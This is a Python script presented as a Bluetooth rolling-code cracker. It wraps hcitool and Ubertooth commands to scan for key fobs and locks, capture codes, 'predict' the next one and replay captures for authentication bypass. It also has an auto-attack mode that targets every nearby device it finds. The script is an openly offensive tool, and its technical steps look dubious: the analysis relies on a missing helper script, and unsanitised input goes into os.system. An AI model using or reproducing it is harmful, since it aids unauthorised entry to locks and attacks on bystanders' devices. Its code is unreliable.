import argparse
import os
import time
from scapy.all import *

# -------------------------------------------
# Bluetooth Rolling Code Cracker
# -------------------------------------------
# Features:
# - Captures rolling code sequences using Ubertooth One
# - Analyzes & predicts next valid rolling code
# - Performs replay attacks for Bluetooth-based locks
# - Bypasses basic authentication mechanisms
# - Supports automated attack chaining & target profiling
#
# Requirements:
# - Ubertooth One
# - Python 3.x
# - btlejack, hcitool, l2ping (for BLE packet analysis)
# - Scapy for packet parsing
#
# Usage:
# 1. Scan for Bluetooth key fobs or locks:
#    python bt_rolling_code.py --scan
# 2. Capture rolling code sequences:
#    python bt_rolling_code.py --capture XX:XX:XX:XX:XX:XX
# 3. Analyze rolling codes and predict next valid code:
#    python bt_rolling_code.py --analyze capture_log.pcap
# 4. Replay captured codes for authentication bypass:
#    python bt_rolling_code.py --replay capture_log.pcap
# 5. Enable automated attack chaining:
#    python bt_rolling_code.py --auto-attack
# -------------------------------------------

def scan_bluetooth():
    """Scans for Bluetooth key fobs or locks."""
    print("[+] Scanning for Bluetooth rolling code devices...")
    os.system("hcitool scan > bt_rolling_code_scan_results.txt")
    os.system("hcitool lescan --passive > ble_rolling_code_scan_results.txt & sleep 10; pkill --signal SIGINT hcitool")
    print("[✔] Scan complete. Results saved to bt_rolling_code_scan_results.txt & ble_rolling_code_scan_results.txt")

def capture_rolling_codes(target):
    """Captures rolling code sequences using Ubertooth One."""
    print(f"[+] Capturing rolling codes from {target}...")
    os.system(f"ubertooth-rx -f 2.402G -c capture_log.pcap --bt5 {target}")
    print("[✔] Rolling code capture complete. Data saved to capture_log.pcap")

def analyze_rolling_codes(pcap_file):
    """Analyzes rolling codes and predicts the next valid code."""
    print(f"[+] Analyzing rolling codes from {pcap_file}...")
    os.system(f"python rolling_code_analyzer.py --input {pcap_file}")
    print("[✔] Analysis complete. Predictions saved.")

def replay_rolling_codes(pcap_file):
    """Replays captured rolling codes for authentication bypass."""
    print(f"[+] Replaying rolling codes from {pcap_file}...")
    os.system(f"ubertooth-tx -f 2.402G --bt5 {pcap_file}")
    print("[✔] Rolling code replay complete.")

def auto_attack():
    """Runs a sequence of rolling code attacks."""
    print("[+] Running automated rolling code attack sequence...")
    scan_bluetooth()
    with open("bt_rolling_code_scan_results.txt", "r") as file:
        devices = file.readlines()[1:]
        for device in devices:
            mac = device.split()[0]
            print(f"[*] Attacking {mac}...")
            capture_rolling_codes(mac)
            analyze_rolling_codes("capture_log.pcap")
            replay_rolling_codes("capture_log.pcap")
    print("[✔] Automated attack sequence complete.")

def main():
    parser = argparse.ArgumentParser(description="Bluetooth Rolling Code Cracker")
    parser.add_argument("--scan", action='store_true', help="Scan for Bluetooth key fobs or locks")
    parser.add_argument("--capture", type=str, help="Capture rolling code sequences from a target")
    parser.add_argument("--analyze", type=str, help="Analyze rolling codes and predict next valid code")
    parser.add_argument("--replay", type=str, help="Replay captured rolling codes")
    parser.add_argument("--auto-attack", action='store_true', help="Enable automated attack chaining")
    args = parser.parse_args()

    if args.scan:
        scan_bluetooth()
    elif args.capture:
        capture_rolling_codes(args.capture)
    elif args.analyze:
        analyze_rolling_codes(args.analyze)
    elif args.replay:
        replay_rolling_codes(args.replay)
    elif args.auto_attack:
        auto_attack()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
